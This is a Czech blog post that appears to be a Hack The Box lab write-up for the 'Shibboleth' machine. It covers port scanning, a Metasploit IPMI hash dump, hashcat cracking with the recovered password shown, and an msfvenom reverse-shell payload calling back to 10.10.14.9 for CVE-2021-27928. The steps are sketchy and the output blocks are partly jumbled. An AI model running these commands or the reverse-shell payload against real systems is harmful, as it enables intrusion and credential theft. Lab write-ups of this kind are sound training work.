---
layout: post
author: Tomáš Matějíček
title: "Shibboleth"
date: 2021-01-16
tags: linux rce exploit enumeration privesc hackthebox
---
[Shibboleth](https://www.hackthebox.com/home/machines/profile/410) je stroj z Hack The Box. Cílem je přejít od prvotní enumerace až k plnému ovládnutí systému.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Vyhledání otevřených portů (2)
Nejdřív mapuji služby, které jsou dostupné zvenku.
`nmap -sU --min-rate 5000 --max-retries 1 -p- --open $IP`
```
PORT    STATE SERVICE
623/udp open  asf-rmcp
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`msfconsole`
```
use scanner/ipmi/ipmi_dumphashes
set RHOST 10.10.11.124

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:__CENSORED__:__CENSORED__
```

### Lámání hesel nebo hashů
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt`
```
=> ilovepumkinpie1
```

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__

## /etc/zabbix/zabbix_server.conf
DBHost=localhost
DBName=zabbix
DBUser=zabbix
DBPassword=__CENSORED__

## CVE-2021-27928
```

### Spuštění exploitu (2)
Zde dochází k praktickému zneužití zranitelnosti.
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4001 -f elf-so -o CVE-2021-27928.so`

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat /root/root.txt`
```
__CENSORED__
```
